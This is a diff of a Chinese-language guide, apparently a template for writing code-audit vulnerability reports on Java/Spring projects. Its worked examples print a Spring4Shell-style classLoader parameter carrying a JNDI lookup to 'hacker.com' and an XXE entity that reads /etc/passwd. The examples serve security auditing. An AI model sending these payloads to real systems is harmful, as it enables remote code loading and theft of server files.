@@ -181,63 +181,36 @@ public static List<GeographicalInformationDto> importExcel(MultipartFile file) {
 6. **未使用的安全机制**：项目中存在但未启用
 7. **漏洞类型归纳**：CWE 标准分类
 
-**示例**：
+**⚠️ 漏洞分析写作规范（重要）**
+
+漏洞分析必须按照以下结构书写（约 200-300 字）：
+
+```
+1. 指出危险代码位置和具体代码
+2. 说明该配置/代码的风险
+3. 分析当前状态（是否有受影响的接口）
+4. 分析当前 DTO/参数的字段情况
+5. 给出风险场景：如果未来新增某接口会如何
+6. 具体的攻击路径和恶意输入示例
+7. 攻击原理的解释
+```
+
+**完整示例**：
 ```markdown
 **漏洞分析**：
 
-`ExcelController.importExcel()` 方法（ExcelController.java:35）接收 MultipartFile 参数，
-直接调用 `ExcelUtil.importExcel()` 保存到服务器，路径为 `/var/www/uploads/`。
+在 HotelGroupBaseInfoController 中存在危险的 @InitBinder 配置：`binder.setDisallowedFields(new String[]{})`（第169-172行）。该配置显式禁用 Spring 的字段过滤机制，若项目中存在通过请求参数绑定对象的端点，攻击者可构造恶意参数触发安全风险。
 
-**调用链追踪**：
-```
-ExcelController.importExcel() (ExcelController.java:35)
-  → ExcelUtil.importExcel() (ExcelUtil.java:79)
-    → EasyExcel.read() (ExcelUtil.java:82)
+当前该控制器仅有一个接口 `/list` 使用表单参数绑定（`@Valid GetHotelGroupBaseListRequest request`，无 `@RequestBody`），但 DTO 只含三个字段（size、current、supId），均为分页参数，无敏感字段。若后续新增参数绑定接口（如 `@GetMapping("/export") public void export(ExportCondition condition)`），攻击者可构造恶意 URL：`?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{jndi:ldap://hacker.com/exp}`。Spring 在绑定参数时，会以 DTO 对象为反射起点，通过 `getClass().getModule().getClassLoader()...` 链式反射直达 Tomcat 核心组件，篡改配置注入恶意表达式。关键点：恶意参数并非绑定到 DTO 业务字段，而是利用 Java 对象继承 Object 的特性，将业务对象作为"跳板"直达底层。
 ```
 
-**缺少的安全控制**：
+**另一个示例（XXE 漏洞）**：
+```markdown
+**漏洞分析**：
 
-| 控制类型 | 状态 | 说明 |
-|---------|------|------|
-| 文件类型校验 | ❌ 缺失 | 未检查 Content-Type 和文件扩展名 |
-| 文件内容校验 | ❌ 缺失 | 未检查文件魔数/文件头 |
-| 文件大小限制 | ❌ 缺失 | 可上传超大文件触发 DoS |
-| XXE 防护 | ❌ 缺失 | 未禁用 XML 外部实体 |
+在 ExcelController.importExcel() 方法中，使用 EasyExcel 解析用户上传的 Excel 文件（ExcelController.java:35-42），未配置禁用 XML 外部实体选项。Excel 文件本质是 ZIP 压缩的 XML 文件集合，攻击者可构造恶意 Excel 文件触发 XXE 攻击。
 
-**攻击路径**：
-
-1. 攻击者构造恶意 Excel 文件，在 XML 中定义外部实体
-2. 外部实体指向 `/etc/passwd` 等敏感文件
-3. 上传文件到服务器进行解析
-4. 解析过程中 XML 外部实体被加载，读取服务器敏感文件
-5. 文件内容通过响应返回给攻击者
-
-**恶意输入示例**：
-```xml
-<!DOCTYPE data [
-    <!ENTITY secret SYSTEM "file:///etc/passwd">
-]>
-<data>&secret;</data>
-```
-
-**对比分析**：
-同类方法 `ImageController.uploadImage()` 在 Service 层有完整的校验：
-- 检查 Content-Type 是否为 image/*
-- 检查文件扩展名白名单
-- 配置了安全的 XML 解析器
-
-而 `ExcelController.importExcel()` 完全没有这些校验。
-
-**未使用的安全机制**：
-项目已引入 Apache POI 的安全配置选项，但未启用：
-```xml
-<dependency>
-    <groupId>org.apache.poi</groupId>
-    <artifactId>poi-ooxml</artifactId>
-</dependency>
-```
-
-**漏洞类型归纳**：XXE 外部实体注入（CWE-611）、任意文件上传（CWE-434）
+当前接口接收 MultipartFile 类型的文件参数，直接传入 `EasyExcel.read()` 进行解析，无任何安全校验。若攻击者构造包含外部实体定义的恶意 Excel 文件，在 XML 中定义 `<!ENTITY secret SYSTEM "file:///etc/passwd">`，上传后服务器解析时触发 XXE，读取服务器敏感文件。调用链：`HTTP POST /import → ExcelController.importExcel() → ExcelUtil.importExcel() → EasyExcel.read() → XML 解析触发 XXE`。关键点：EasyExcel 底层使用 XML 解析器，默认允许外部实体，需显式禁用。
 ```
 
 ---
